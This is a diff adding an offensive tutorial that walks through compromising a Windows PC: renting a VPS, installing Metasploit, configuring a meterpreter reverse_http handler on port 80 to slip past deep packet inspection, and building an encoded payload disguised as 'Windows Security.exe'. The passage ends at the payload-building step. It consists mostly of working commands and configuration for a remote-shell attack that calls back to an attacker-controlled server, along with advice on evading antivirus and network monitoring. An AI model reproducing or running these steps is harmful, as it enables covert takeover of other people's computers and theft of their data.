@@ -1,0 +1,68 @@
+HACKING WINDOWS PC WITH A LIVE USB
+__________________________________
+
+In this PoC a powered-off computer will be compromised evading AV software and bypassing the password.
+
+--> Requirements
+
+    - 1 live usb
+    - 1 normal usb
+    - VPS (Virtual Private Server)
+
+--> Steps
+
+    1) Create live USB
+
+       - Typical linux installation with Rufus
+       - We have our Kali Linux LIve computer
+
+    2) Set up the VPS
+
+       -> Consider the minimum requirements for metasploit
+       -> Consider the ToS to buy an accurate VPS
+       -> The tutorials often use DigitalOcean
+
+    3) Install Metasploit on the VPS
+
+       --> Automatic script
+       
+       >> curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+
+       >> sudo chmod 755 msfinstall
+
+       >> sudo ./msfinstall
+
+   4) Install Screen
+
+      --> This is done to keep sessions alive even if we close terminal
+
+      >> apt-get install screen
+      >> screen -list
+
+      	 - list sessions
+
+      >> screen  (to start a new session)
+
+      >> screen -r SESSION-TO-RECONNECT
+
+   5) Configure Metasploit
+
+   --> Simple configuration of a handler
+
+   >> nano automate.rc
+
+      use multi/handler
+      set payload windows/meterpreter/reverse_http	(interesting to evade Deep Packet inspection (DPI) as sometimes IT Admin look for unusual port (4444, 5555) TCP traffic)
+      set LHOST My.VPS.IP.Here
+      set LPORT 80
+      set ExitOnSession false
+      set EnableStageEncoding True
+      exploit -j
+
+   >> screen msfconsole -r ~/automate.rc
+
+
+   6) Create payload with msfvenom
+
+      >> msfvenom --encoder cmd/powershell_base64 --payload windows/meterpreter/reverse_http LHOST=My.VPS.IP.Here LPORT=80 --arch x86 --platform win --format exe --out ~/'Windows Security.exe'
+
